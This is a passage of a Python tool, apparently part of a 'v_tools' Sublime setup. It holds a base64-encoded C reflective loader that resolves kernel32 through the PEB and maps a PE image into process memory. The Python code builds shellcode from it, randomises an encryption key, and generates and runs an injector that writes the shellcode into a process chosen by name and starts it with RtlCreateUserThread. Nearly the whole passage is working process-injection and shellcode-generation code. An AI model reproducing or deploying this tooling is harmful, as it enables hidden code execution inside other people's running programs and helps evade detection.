PmZuX1ZpcnR1YWxBbGxvY0V4ICAgICAgICAgICAgPSAoRk5fVmlydHVhbEFsbG9jRXgpICAgICAgICAgIHBGbi0+Zm5fR2V0UHJvY0FkZHJlc3MocEZuLT5mbl9Mb2FkTGlicmFyeUEoc3pLZXJuZWwzMiksIHN6VmlydHVhbEFsbG9jRXgpOw0KICAgIHBGbi0+Zm5fVmlydHVhbEZyZWVFeCAgICAgICAgICAgICA9IChGTl9WaXJ0dWFsRnJlZUV4KSAgICAgICAgICAgcEZuLT5mbl9HZXRQcm9jQWRkcmVzcyhwRm4tPmZuX0xvYWRMaWJyYXJ5QShzektlcm5lbDMyKSwgc3pWaXJ0dWFsRnJlZUV4KTsNCiAgICBwRm4tPmZuX0NyZWF0ZVJlbW90ZVRocmVhZCAgICAgICAgPSAoRk5fQ3JlYXRlUmVtb3RlVGhyZWFkKSAgICAgIHBGbi0+Zm5fR2V0UHJvY0FkZHJlc3MocEZuLT5mbl9Mb2FkTGlicmFyeUEoc3pLZXJuZWwzMiksIHN6Q3JlYXRlUmVtb3RlVGhyZWFkKTsNCiAgICBwRm4tPmZuX1dyaXRlUHJvY2Vzc01lbW9yeSAgICAgICAgPSAoRk5fV3JpdGVQcm9jZXNzTWVtb3J5KSAgICAgIHBGbi0+Zm5fR2V0UHJvY0FkZHJlc3MocEZuLT5mbl9Mb2FkTGlicmFyeUEoc3pLZXJuZWwzMiksIHN6V3JpdGVQcm9jZXNzTWVtb3J5KTsNCiAgICBwRm4tPmZuX0dldEN1cnJlbnRQcm9jZXNzSWQgICAgICAgPSAoRk5fR2V0Q3VycmVudFByb2Nlc3NJZCkgICAgIHBGbi0+Zm5fR2V0UHJvY0FkZHJlc3MocEZuLT5mbl9Mb2FkTGlicmFyeUEoc3pLZXJuZWwzMiksIHN6R2V0Q3VycmVudFByb2Nlc3NJZCk7DQogICAgcEZuLT5mbl9HZXRDdXJyZW50UHJvY2VzcyAgICAgICAgID0gKEZOX0dldEN1cnJlbnRQcm9jZXNzKSAgICAgICBwRm4tPmZuX0dldFByb2NBZGRyZXNzKHBGbi0+Zm5fTG9hZExpYnJhcnlBKHN6S2VybmVsMzIpLCBzekdldEN1cnJlbnRQcm9jZXNzKTsNCiAgICBwRm4tPmZuX21hbGxvYyAgICAgICAgICAgICAgICAgICAgPSAoRk5fbWFsbG9jKSAgICAgICAgICAgICAgICAgIHBGbi0+Zm5fR2V0UHJvY0FkZHJlc3MocEZuLT5mbl9Mb2FkTGlicmFyeUEoc3ptc3ZjcnQpLCBzem1hbGxvYyk7DQp9DQojaWZkZWYgX1dJTjY0DQogICAgI2RlZmluZSBVTE9OR0xPTkcgVUxPTkdMT05HDQogICAgI2RlZmluZSBQVUxPTkdMT05HIFBVTE9OR0xPTkcNCiNlbHNlDQogICAgI2RlZmluZSBVTE9OR0xPTkcgVUxPTkcNCiAgICAjZGVmaW5lIFBVTE9OR0xPTkcgUFVMT05HDQojZW5kaWYNCnR5cGVkZWYgc3RydWN0IF9QRV9JTkZPIHsNCiAgICBMUFZPSUQgIGJhc2U7DQogICAgQk9PTCAgICByZWxvYzsNCiAgICBMUFZPSUQgIEdldF9Qcm9jOw0KICAgIExQVk9JRCAgTG9hZF9ETEw7DQp9UEVfSU5GTyAsICpMUEVfSU5GTzsNCnZvaWQgQWRqdXN0UEUoTFBFX0lORk8gcGUpIHsNCiAgICBQSU1BR0VfRE9TX0hFQURFUiAgICAgICAgICAgZG9zOw0KICAgIFBJTUFHRV9OVF9IRUFERVJTICAgICAgICAgICBudDsNCiAgICBMUFZPSUQgICAgICAgICAgICAgICAgICAgICAgYmFzZTsNCiAgICBQSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IgICAgaW1wb3J0Ow0KICAgIFBJTUFHRV9USFVOS19EQVRBICAgICAgICAgICBPdGh1bmssRnRodW5rOw0KICAgIFBJTUFHRV9CQVNFX1JFTE9DQVRJT04gICAgICByZWxvYzsNCiAgICBQSU1BR0VfVExTX0RJUkVDVE9SWSAgICAgICAgdGxzOw0KICAgIFBJTUFHRV9UTFNfQ0FMTEJBQ0sqICAgICAgICBDYWxsQmFjazsNCiAgICBVTE9OR0xPTkcqICAgICAgICAgICAgICAgICAgcCxkZWx0YTsNCiAgICBCT09MICAgICAgICAoKkRMTF9FbnRyeSkgICAgKExQVk9JRCwgRFdPUkQsIExQVk9JRCk7DQogICAgTFBWT0lEICAgICAgKCpMb2FkX0RMTCkgICAgIChMUFNUUik7DQogICAgTFBWT0lEICAgICAgKCpHZXRfUHJvYykgICAgIChMUFZPSUQsIExQU1RSKTsNCiAgICBiYXNlICAgICAgID0gcGUtPmJhc2U7DQogICAgTG9hZF9ETEwgICA9IHBlLT5Mb2FkX0RMTDsNCiAgICBHZXRfUHJvYyAgID0gcGUtPkdldF9Qcm9jOw0KICAgIGRvcyAgICAgICAgPSAoUElNQUdFX0RPU19IRUFERVIpYmFzZTsNCiAgICBudCAgICAgICAgID0gKFBJTUFHRV9OVF9IRUFERVJTKShiYXNlICsgZG9zLT5lX2xmYW5ldyk7DQogICAgRExMX0VudHJ5ICA9IGJhc2UrbnQtPk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQ7DQogICAgaWYocGUtPnJlbG9jKXsNCiAgICAgICAgaWYobnQtPk9wdGlvbmFsSGVhZGVyLkRhdGFEaXJlY3RvcnlbNV0uVmlydHVhbEFkZHJlc3MgIT0gMCl7DQogICAgICAgICAgICBkZWx0YSA9IChVTE9OR0xPTkcpYmFzZS1udC0+T3B0aW9uYWxIZWFkZXIuSW1hZ2VCYXNlOw0KICAgICAgICAgICAgcmVsb2MgPSAoUElNQUdFX0JBU0VfUkVMT0NBVElPTikoYmFzZStudC0+T3B0aW9uYWxIZWFkZXIuRGF0YURpcmVjdG9yeVs1XS5WaXJ0dWFsQWRkcmVzcyk7DQogICAgICAgICAgICB3aGlsZShyZWxvYy0+VmlydHVhbEFkZHJlc3MpIHsNCiAgICAgICAgICAgICAgICBMUFZPSUQgIGRlc3QgICAgPSBiYXNlK3JlbG9jLT5WaXJ0dWFsQWRkcmVzczsNCiAgICAgICAgICAgICAgICBpbnQgICAgIG5FbnRyeSAgPSAocmVsb2MtPlNpemVPZkJsb2NrLXNpemVvZihJTUFHRV9CQVNFX1JFTE9DQVRJT04pKS8yOw0KICAgICAgICAgICAgICAgIFBXT1JEICAgZGF0YSAgICA9IChQV09SRCkoKExQVk9JRClyZWxvYytzaXplb2YoSU1BR0VfQkFTRV9SRUxPQ0FUSU9OKSk7DQogICAgICAgICAgICAgICAgaW50IGk7DQogICAgICAgICAgICAgICAgZm9yKGkgPSAwOyBpPG5FbnRyeTsgaSsrLGRhdGErKykgew0KICAgICAgICAgICAgICAgICAgICBpZigoKCpkYXRhKSA+PiAxMikgPT0gMTApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHAgPSAoUFVMT05HTE9ORykoZGVzdCsoKCpkYXRhKSYweGZmZikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgKnAgKz0gZGVsdGE7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgcmVsb2MgPSAoUElNQUdFX0JBU0VfUkVMT0NBVElPTikoKExQVk9JRClyZWxvYytyZWxvYy0+U2l6ZU9mQmxvY2spOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGlmKG50LT5PcHRpb25hbEhlYWRlci5EYXRhRGlyZWN0b3J5WzFdLlZpcnR1YWxBZGRyZXNzICE9IDApew0KICAgICAgICBpbXBvcnQgPSAoUElNQUdFX0lNUE9SVF9ERVNDUklQVE9SKShiYXNlK250LT5PcHRpb25hbEhlYWRlci5EYXRhRGlyZWN0b3J5WzFdLlZpcnR1YWxBZGRyZXNzKTsNCiAgICAgICAgd2hpbGUoaW1wb3J0LT5OYW1lKSB7DQogICAgICAgICAgICBMUFZPSUQgZGxsID0gKCpMb2FkX0RMTCkoYmFzZStpbXBvcnQtPk5hbWUpOw0KICAgICAgICAgICAgT3RodW5rID0gKFBJTUFHRV9USFVOS19EQVRBKShiYXNlK2ltcG9ydC0+T3JpZ2luYWxGaXJzdFRodW5rKTsNCiAgICAgICAgICAgIEZ0aHVuayA9IChQSU1BR0VfVEhVTktfREFUQSkoYmFzZStpbXBvcnQtPkZpcnN0VGh1bmspOw0KICAgICAgICAgICAgaWYoIWltcG9ydC0+T3JpZ2luYWxGaXJzdFRodW5rKXsNCiAgICAgICAgICAgICAgICBPdGh1bmsgPSBGdGh1bms7DQogICAgICAgICAgICB9DQogICAgICAgICAgICB3aGlsZShPdGh1bmstPnUxLkFkZHJlc3NPZkRhdGEpIHsNCiAgICAgICAgICAgICAgICBpZihPdGh1bmstPnUxLk9yZGluYWwgJiBJTUFHRV9PUkRJTkFMX0ZMQUcpIHsNCiAgICAgICAgICAgICAgICAgICAgKihVTE9OR0xPTkcgKilGdGh1bmsgPSAoVUxPTkdMT05HKSgqR2V0X1Byb2MpKGRsbCwoTFBTVFIpSU1BR0VfT1JESU5BTChPdGh1bmstPnUxLk9yZGluYWwpKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIFBJTUFHRV9JTVBPUlRfQllfTkFNRSBmbm0gPSAoUElNQUdFX0lNUE9SVF9CWV9OQU1FKShiYXNlK090aHVuay0+dTEuQWRkcmVzc09mRGF0YSk7DQogICAgICAgICAgICAgICAgICAgICooUFVMT05HTE9ORylGdGh1bmsgPSAoVUxPTkdMT05HKSgqR2V0X1Byb2MpKGRsbCxmbm0tPk5hbWUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBPdGh1bmsrKzsNCiAgICAgICAgICAgICAgICBGdGh1bmsrKzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGltcG9ydCsrOw0KICAgICAgICB9DQogICAgfQ0KICAgIGlmKG50LT5PcHRpb25hbEhlYWRlci5EYXRhRGlyZWN0b3J5WzldLlZpcnR1YWxBZGRyZXNzICE9IDApew0KICAgICAgICB0bHMgPSAoUElNQUdFX1RMU19ESVJFQ1RPUlkpKGJhc2UrbnQtPk9wdGlvbmFsSGVhZGVyLkRhdGFEaXJlY3RvcnlbOV0uVmlydHVhbEFkZHJlc3MpOw0KICAgICAgICBpZih0bHMtPkFkZHJlc3NPZkNhbGxCYWNrcyAhPSAwKXsNCiAgICAgICAgICAgIENhbGxCYWNrID0gKFBJTUFHRV9UTFNfQ0FMTEJBQ0sgKikodGxzLT5BZGRyZXNzT2ZDYWxsQmFja3MpOw0KICAgICAgICAgICAgd2hpbGUoKkNhbGxCYWNrKSB7DQogICAgICAgICAgICAgICAgKCpDYWxsQmFjaykoYmFzZSxETExfUFJPQ0VTU19BVFRBQ0gsTlVMTCk7DQogICAgICAgICAgICAgICAgQ2FsbEJhY2srKzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAoKkRMTF9FbnRyeSkoYmFzZSxETExfUFJPQ0VTU19BVFRBQ0gsTlVMTCk7DQp9DQovLyBAY2hhcmxpc3QNCnZvaWQgbG9hZGRsbHJ1bihQRlVOQ1RJT04gcEZuKXsNCiAgICBpbnQgaTsNCiAgICBIQU5ETEUgICAgICBwcm9jOw0KICAgIExQVk9JRCAgICAgIGJhc2UsUmJhc2UsQWRqOw0KICAgIERXT1JEICAgICAgIEZ1bmNfU2l6ZTsNCiAgICBQRV9JTkZPICAgICBwZTsNCiAgICBQSU1BR0VfRE9TX0hFQURFUiAgICAgICBkb3M7DQogICAgUElNQUdFX1NFQ1RJT05fSEVBREVSICAgc2VjOw0KICAgIFBJTUFHRV9OVF9IRUFERVJTICAgICAgIG50Ow0KICAgIC8vIEBwbGFjZWhvbGRlcl9zaGVsbGNvZGUNCiAgICBkb3MgPSAoUElNQUdFX0RPU19IRUFERVIpYmFzZTsNCiAgICBpZihkb3MtPmVfbWFnaWMgIT0gMjMxMTcpIHsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICBudCA9IChQSU1BR0VfTlRfSEVBREVSUykoYmFzZStkb3MtPmVfbGZhbmV3KTsNCiAgICBzZWMgPSAoUElNQUdFX1NFQ1RJT05fSEVBREVSKSgoTFBWT0lEKW50KzI0K250LT5GaWxlSGVhZGVyLlNpemVPZk9wdGlvbmFsSGVhZGVyKTsNCiAgICBpZihudC0+T3B0aW9uYWxIZWFkZXIuTWFnaWMgIT0gSU1BR0VfTlRfT1BUSU9OQUxfSERSX01BR0lDKSB7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgcHJvYyA9IHBGbi0+Zm5fR2V0Q3VycmVudFByb2Nlc3MoKTsNCiAgICBwZS5yZWxvYyA9IDA7DQogICAgaWYoKFJiYXNlID0gcEZuLT5mbl9WaXJ0dWFsQWxsb2NFeChwcm9jLChMUFZPSUQpbnQtPk9wdGlvbmFsSGVhZGVyLkltYWdlQmFzZSxudC0+T3B0aW9uYWxIZWFkZXIuU2l6ZU9mSW1hZ2UsTUVNX0NPTU1JVHxNRU1fUkVTRVJWRSxQQUdFX0VYRUNVVEVfUkVBRFdSSVRFKSkgPT0gTlVMTCkgew0KICAgICAgICBwZS5yZWxvYyA9IDE7DQogICAgICAgIGlmKChSYmFzZSA9IHBGbi0+Zm5fVmlydHVhbEFsbG9jRXgocHJvYyxOVUxMLG50LT5PcHRpb25hbEhlYWRlci5TaXplT2ZJbWFnZSxNRU1fQ09NTUlUfE1FTV9SRVNFUlZFLFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpKSA9PSBOVUxMKSB7DQogICAgICAgICAgICByZXR1cm47DQogICAgICAgIH0NCiAgICB9DQogICAgcEZuLT5mbl9Xcml0ZVByb2Nlc3NNZW1vcnkocHJvYyxSYmFzZSxiYXNlLG50LT5PcHRpb25hbEhlYWRlci5TaXplT2ZIZWFkZXJzLE5VTEwpOw0KICAgIGZvcihpID0gMDsgaTxudC0+RmlsZUhlYWRlci5OdW1iZXJPZlNlY3Rpb25zOyBpKyspIHsNCiAgICAgICAgcEZuLT5mbl9Xcml0ZVByb2Nlc3NNZW1vcnkocHJvYyxSYmFzZStzZWMtPlZpcnR1YWxBZGRyZXNzLGJhc2Urc2VjLT5Qb2ludGVyVG9SYXdEYXRhLHNlYy0+U2l6ZU9mUmF3RGF0YSxOVUxMKTsNCiAgICAgICAgc2VjKys7DQogICAgfQ0KICAgIEZ1bmNfU2l6ZSA9IChEV09SRCkoKFVMT05HTE9ORylsb2FkZGxscnVuLShVTE9OR0xPTkcpQWRqdXN0UEUpOw0KICAgIHBlLmJhc2UgPSBSYmFzZTsNCiAgICBwZS5HZXRfUHJvYyA9IHBGbi0+Zm5fR2V0UHJvY0FkZHJlc3M7DQogICAgcGUuTG9hZF9ETEwgPSBwRm4tPmZuX0xvYWRMaWJyYXJ5QTsNCiAgICBBZGogPSBwRm4tPmZuX1ZpcnR1YWxBbGxvY0V4KHByb2MsTlVMTCxGdW5jX1NpemUrc2l6ZW9mKHBlKSxNRU1fQ09NTUlUfE1FTV9SRVNFUlZFLFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOw0KICAgIGlmKEFkaiA9PSBOVUxMKSB7DQogICAgICAgIHBGbi0+Zm5fVmlydHVhbEZyZWVFeChwcm9jLFJiYXNlLDAsTUVNX1JFTEVBU0UpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KICAgIHBGbi0+Zm5fV3JpdGVQcm9jZXNzTWVtb3J5KHByb2MsIEFkaiwgJnBlLCBzaXplb2YocGUpLCBOVUxMKTsNCiAgICBwRm4tPmZuX1dyaXRlUHJvY2Vzc01lbW9yeShwcm9jLCBBZGorc2l6ZW9mKHBlKSwgQWRqdXN0UEUsIEZ1bmNfU2l6ZSwgTlVMTCk7DQogICAgcEZuLT5mbl9DcmVhdGVSZW1vdGVUaHJlYWQocHJvYywgTlVMTCwgMCwgKExQVEhSRUFEX1NUQVJUX1JPVVRJTkUpKEFkaitzaXplb2YocGUpKSwgQWRqLCAwLCBOVUxMKTsNCiAgICByZXR1cm47DQp9DQp2b2lkIFNoZWxsY29kZUVudHJ5KCl7DQogICAgRlVOQ1RJT04gZm47DQogICAgSW5pdEZ1bmN0aW9ucygmZm4pOw0KICAgIGxvYWRkbGxydW4oJmZuKTsNCn0NCiNpZmRlZiBfV0lONjQNCkhNT0RVTEUgZ2V0S2VybmVsMzIoKXsNCiAgICBhc20oIm1vdiAlZ3M6KDB4NjApLCAlcmF4Iik7DQogICAgYXNtKCJtb3YgMHgxOCglcmF4KSwgJXJheCIpOw0KICAgIGFzbSgibW92IDB4MjAoJXJheCksICVyYXgiKTsNCiAgICBhc20oIm1vdiAoJXJheCksICVyYXgiKTsNCiAgICBhc20oIm1vdiAoJXJheCksICVyYXgiKTsNCiAgICBhc20oIm1vdiAweDIwKCVyYXgpLCAlcmF4Iik7DQogICAgI2lmZGVmIF9fTUlOR1czMl9fDQogICAgYXNtKCJwb3AgJXJicCIpOyAvLyBzb21ldGltZSB5b3UgY2Fubm90IHVzZSBuYWtlZCBmdW5jLCB0aGlzIGlzIGZvciBtb3JlIGNvbXBhdGliaWxpdHkuDQogICAgYXNtKCJyZXQiKTsgLy8gVElOWUMgZG5vdCBuZWVkIHRoaXMNCiAgICAjZW5kaWYNCn0NCiNlbHNlDQpITU9EVUxFIGdldEtlcm5lbDMyKCl7DQogICAgYXNtKCJtb3YgJWZzOigweDMwKSwgJWVheCIpOw0KICAgIGFzbSgibW92IDB4MGMoJWVheCksICVlYXgiKTsNCiAgICBhc20oIm1vdiAweDE0KCVlYXgpLCAlZWF4Iik7DQogICAgYXNtKCJtb3YgKCVlYXgpLCAlZWF4Iik7DQogICAgYXNtKCJtb3YgKCVlYXgpLCAlZWF4Iik7DQogICAgYXNtKCJtb3YgMHgxMCglZWF4KSwgJWVheCIpOw0KICAgICNpZmRlZiBfX01JTkdXMzJfXw0KICAgIGFzbSgicG9wICVlYnAiKTsgLy8gc29tZXRpbWUgeW91IGNhbm5vdCBjb21wbGllciBuYWtlZCBmdW5jLCB0aGlzIGlzIGZvciBtb3JlIGNvbXBhdGliaWxpdHkuDQogICAgYXNtKCJyZXQiKTsgLy8gVElOWUMgZG5vdCBuZWVkIHRoaXMNCiAgICAjZW5kaWYNCn0NCiNlbmRpZg0KRkFSUFJPQyBnZXRQcm9jQWRkcmVzcyhITU9EVUxFIGhNb2R1bGVCYXNlKXsNCiAgICBMUEJZVEUgbHBCYXNlQWRkciA9IChMUEJZVEUpaE1vZHVsZUJhc2U7DQogICAgUElNQUdFX0RPU19IRUFERVIgbHBEb3NIZHIgPSAoUElNQUdFX0RPU19IRUFERVIpbHBCYXNlQWRkcjsNCiAgICBQSU1BR0VfTlRfSEVBREVSUyBwTnRIZHJzID0gKFBJTUFHRV9OVF9IRUFERVJTKShscEJhc2VBZGRyICsgbHBEb3NIZHItPmVfbGZhbmV3KTsNCiAgICBQSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSBwRXhwb3J0RGlyID0gKFBJTUFHRV9FWFBPUlRfRElSRUNUT1JZKShscEJhc2VBZGRyICsgcE50SGRycy0+T3B0aW9uYWxIZWFkZXIuRGF0YURpcmVjdG9yeVtJTUFHRV9ESVJFQ1RPUllfRU5UUllfRVhQT1JUXS5WaXJ0dWFsQWRkcmVzcyk7DQogICAgTFBEV09SRCBwTmFtZUFycmF5ID0gKExQRFdPUkQpKGxwQmFzZUFkZHIgKyBwRXhwb3J0RGlyLT5BZGRyZXNzT2ZOYW1lcyk7DQogICAgTFBEV09SRCBwQWRkckFycmF5ID0gKExQRFdPUkQpKGxwQmFzZUFkZHIgKyBwRXhwb3J0RGlyLT5BZGRyZXNzT2ZGdW5jdGlvbnMpOw0KICAgIExQV09SRCBwT3JkQXJyYXkgPSAoTFBXT1JEKShscEJhc2VBZGRyICsgcEV4cG9ydERpci0+QWRkcmVzc09mTmFtZU9yZGluYWxzKTsNCiAgICBGQVJQUk9DIEdldFByb2NBZGRyZXNzQVBJOw0KICAgIFVJTlQgaSA9IDA7DQogICAgZm9yICg7IGkgPCBwRXhwb3J0RGlyLT5OdW1iZXJPZk5hbWVzOyBpKyspew0KICAgICAgICBMUFNUUiBwRnVuY05hbWUgPSAoTFBTVFIpKGxwQmFzZUFkZHIgKyBwTmFtZUFycmF5W2ldKTsNCiAgICAgICAgaWYgKCAgICBwRnVuY05hbWVbMF0gPT0gJ0cnICYmDQogICAgICAgICAgICAgICAgcEZ1bmNOYW1lWzFdID09ICdlJyAmJg0KICAgICAgICAgICAgICAgIHBGdW5jTmFtZVsyXSA9PSAndCcgJiYNCiAgICAgICAgICAgICAgICBwRnVuY05hbWVbM10gPT0gJ1AnICYmDQogICAgICAgICAgICAgICAgcEZ1bmNOYW1lWzRdID09ICdyJyAmJg0KICAgICAgICAgICAgICAgIHBGdW5jTmFtZVs1XSA9PSAnbycgJiYNCiAgICAgICAgICAgICAgICBwRnVuY05hbWVbNl0gPT0gJ2MnICYmDQogICAgICAgICAgICAgICAgcEZ1bmNOYW1lWzddID09ICdBJyAmJg0KICAgICAgICAgICAgICAgIHBGdW5jTmFtZVs4XSA9PSAnZCcgJiYNCiAgICAgICAgICAgICAgICBwRnVuY05hbWVbOV0gPT0gJ2QnICYmDQogICAgICAgICAgICAgICAgcEZ1bmNOYW1lWzEwXSA9PSAncicgJiYNCiAgICAgICAgICAgICAgICBwRnVuY05hbWVbMTFdID09ICdlJyAmJg0KICAgICAgICAgICAgICAgIHBGdW5jTmFtZVsxMl0gPT0gJ3MnICYmDQogICAgICAgICAgICAgICAgcEZ1bmNOYW1lWzEzXSA9PSAncycgICAgICl7DQogICAgICAgICAgICBHZXRQcm9jQWRkcmVzc0FQSSA9IChGQVJQUk9DKShscEJhc2VBZGRyICsgcEFkZHJBcnJheVtwT3JkQXJyYXlbaV1dKTsNCiAgICAgICAgICAgIHJldHVybiBHZXRQcm9jQWRkcmVzc0FQSTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gTlVMTDsNCn0NCnZvaWQgU2hlbGxjb2RlRW5kKCl7DQp9'
            data = base64.b64decode(data.encode()).decode()
            # data = data.replace('#define ENCRYPT TRUE', '#define ENCRYPT FALSE')

            def make_randint(n):
                ret = '{'
                for i in range(n):
                    ret += str(random.randint(10,110))
                    if (i != n-1):
                        ret += ','
                ret += '}'
                return ret
            data = data.replace('#define ENCRYPTKEY {5,2,7,7,7,7,7,7,7}', '#define ENCRYPTKEY '+make_randint(9))
            data = data.replace('// @charlist', rep_charlist)
            data = data.replace('// @placeholder_shellcode', rep_shellcode)
            with open(tempfilec, 'w', encoding='utf-8') as f:
                f.write(data)
            if bit == '32':
                os.system('tcc -m32 "{}" -o "{}" & "{}"'.format(tempfilec, tempfileexe, tempfileexe))
            if bit == '64':
                os.system('tcc -m64 "{}" -o "{}" & "{}"'.format(tempfilec, tempfileexe, tempfileexe))
            content = readfilebyte("vvv_sh.bin")
            content_len = len(content)
            ret = ''
            for i in content:
                ret += str(i)+','
            shellcode = '{' + ret[:-1] + '}'
            if combine_file_code:
                combine_file_code = combine_file_code.replace('// @placeholder title', '''
#pragma comment(lib,"ntdll")
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
typedef VOID(NTAPI *v_PUSER_THREAD_START_ROUTINE)( PVOID ApcArgument1 );
typedef struct v__CLIENT_ID{ HANDLE UniqueProcess; HANDLE UniqueThread; } v_CLIENT_ID, *v_PCLIENT_ID;
NTSYSAPI NTSTATUS NTAPI RtlCreateUserThread( HANDLE Process, PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL, BOOLEAN CreateSuspended, ULONG_PTR ZeroBits OPTIONAL, SIZE_T MaximumStackSize OPTIONAL, SIZE_T CommittedStackSize OPTIONAL, v_PUSER_THREAD_START_ROUTINE StartAddress, PVOID Parameter OPTIONAL, PHANDLE Thread OPTIONAL, v_PCLIENT_ID ClientId OPTIONAL );
''')
            enumbyname = None
            findbyname = None
            if len(shellcode_config) == 1:
                enumbyname = 'v_EnumProcessByName("{}");'.format(shellcode_config[0])
                findbyname = 'HANDLE proc = v_FindProcessByName("{}");'.format(shellcode_config[0])
            if len(shellcode_config) == 2:
                enumbyname = 'v_EnumProcessByNameAndCommand("{}", L"{}");'.format(shellcode_config[0], shellcode_config[1])
                findbyname = 'HANDLE proc = v_FindProcessByNameAndCommand("{}", L"{}");'.format(shellcode_config[0], shellcode_config[1])
            if len(shellcode_config) == 3:
                enumbyname = 'v_EnumProcessByNameAndPosRevCommand("{}", L"{}", L"{}");'.format(shellcode_config[0], shellcode_config[1], shellcode_config[2])
                findbyname = 'HANDLE proc = v_FindProcessByNameAndPosRevCommand("{}", L"{}", L"{}");'.format(shellcode_config[0], shellcode_config[1], shellcode_config[2])
            repcode = '''
    char shellcode[] = $placeholder_shellcode; 
    int size = '''+str(content_len)+''';
    HANDLE hThread  = NULL;
    '''+findbyname+'''
    PSTR pEntry = (PSTR)VirtualAllocEx(proc, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(proc, (PVOID)pEntry, (PVOID)shellcode, size, NULL);
    NTSTATUS status = RtlCreateUserThread(proc, NULL, FALSE, 0, 0, 0, (PVOID)pEntry, NULL, &hThread, NULL);
'''
            repcode = repcode.replace('$placeholder_shellcode', shellcode)
            return [is_combine_file, repcode, combine_file_code]
        except:
            traceback.print_exc()
        finally:
            if os.path.isfile(tempfilec): os.remove(tempfilec)
            if os.path.isfile(tempfiledll): os.remove(tempfiledll)
            if os.path.isfile(tempfileexe): os.remove(tempfileexe)
            if os.path.isfile("vvv_sh.bin"): os.remove("vvv_sh.bin")

def inject(file, bit='64'):
    dll_repcode = _make_bit_dll_file(file, bit)
    if not dll_repcode:
        print('[*] not a dll inject dll.')
        ccode = readfilecode(file)
        shared = ''
        if ' DllMain(' in ccode:
            shared = '-shared'
        if file.endswith('.c'):
            if bit == '32':
                cmd = 'tcc -m32 {} "{}"'.format(shared, file)
            if bit == '64':
                cmd = 'tcc -m64 {} "{}"'.format(shared, file)
            print('[*] run cmd: {}'.format(cmd))
            os.system(cmd)
        if shared:
            exefile = 'regsvr32.exe /s "{}"'.format(file.rsplit('.', 1)[0] + '.dll')
        else:
            exefile = '"{}"'.format(file.rsplit('.', 1)[0] + '.exe')
        try:
            print('[*] run file: {}'.format(exefile))
            os.system(exefile)
        except:
            print(traceback.format_exc())
        return

    is_combine_file, repcode, combine_file_code = dll_repcode
    python_exe_path = sys.executable
    file_path = os.path.split(file)[0]
    tempfilec = '{}/{}.c'.format(file_path, 'v_temp_mk_c')

    exefile = None
    def make_exe(rscript):
        with open(tempfilec, 'w', encoding='utf-8') as f:
            f.write(rscript)
        print('[*] write in file:{}'.format(tempfilec))
        filename = os.path.split(file)[1]
        if '.' in filename:
            filename = filename.rsplit('.', 1)[0]
        if bit == '32':
            cmd = 'tcc -m32 "{}" -o "{}/{}.exe"'.format(tempfilec, file_path, filename)
        if bit == '64':
            cmd = 'tcc -m64 "{}" -o "{}/{}.exe"'.format(tempfilec, file_path, filename)
        print('[*] run cmd: {}'.format(cmd))
        os.system(cmd)
        return '"{}/{}.exe"'.format(file_path, filename)
    try:
        if not is_combine_file:
            print('[*] is_combine_file:', is_combine_file)
            DllDev = os.path.join(os.path.split(python_exe_path)[0], 'Scripts/sublime3/Data/Packages/User/v_snippet/tcc_dll_inject.sublime-snippet')
            if not os.path.isfile(DllDev):
                print('v_tools sublime not install.')
                return
            dcode = readfilecode(DllDev)
            cscript = re.findall(r'<!\[CDATA\[([\s\S]*)\]\]>', dcode)[0]
            intmain = re.findall(r'((int main[^\{]+\{)[\s\S]*(\}[ \r\n]*))$', cscript)[0]
            rtlcode = '''
#pragma comment(lib,"ntdll")
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
typedef VOID(NTAPI *v_PUSER_THREAD_START_ROUTINE)( PVOID ApcArgument1 );
typedef struct v__CLIENT_ID{ HANDLE UniqueProcess; HANDLE UniqueThread; } v_CLIENT_ID, *v_PCLIENT_ID;
NTSYSAPI NTSTATUS NTAPI RtlCreateUserThread( HANDLE Process, PSECURITY_DESCRIPTOR ThreadSecurityDescriptor OPTIONAL, BOOLEAN CreateSuspended, ULONG_PTR ZeroBits OPTIONAL, SIZE_T MaximumStackSize OPTIONAL, SIZE_T CommittedStackSize OPTIONAL, v_PUSER_THREAD_START_ROUTINE StartAddress, PVOID Parameter OPTIONAL, PHANDLE Thread OPTIONAL, v_PCLIENT_ID ClientId OPTIONAL );
'''
            if 'RtlCreateUserThread' in repcode:
                rscript = cscript.replace(intmain[0], rtlcode + intmain[1] + repcode + intmain[2])
            else:
                rscript = cscript.replace(intmain[0], intmain[1] + repcode + intmain[2])
        else:
            print('[*] is_combine_file:', is_combine_file)
            rscript = combine_file_code.replace('printf("@inject");', repcode).replace('// @inject', repcode)
        exefile = make_exe(rscript)
    except:
        print(traceback.format_exc())
    finally:
        if not is_debugger:
            if os.path.isfile(tempfilec): 
                os.remove(tempfilec)
    if exefile:
        try:
            print('[*] run file: {}'.format(exefile))
            os.system(exefile)
        except:
            print(traceback.format_exc())

def make_dll_inject_32():
    argv = sys.argv
    print('make_dll_inject_32 :::: [ {} ]'.format(' '.join(argv)))
    if len(argv) == 1:
        print('[*] first file must be a dll.c file.')
    if len(argv) > 1:
        file = argv[1]
        inject(file, '32')

def make_dll_inject_64():
    argv = sys.argv
    print('make_dll_inject_64 :::: [ {} ]'.format(' '.join(argv)))
    if len(argv) == 1:
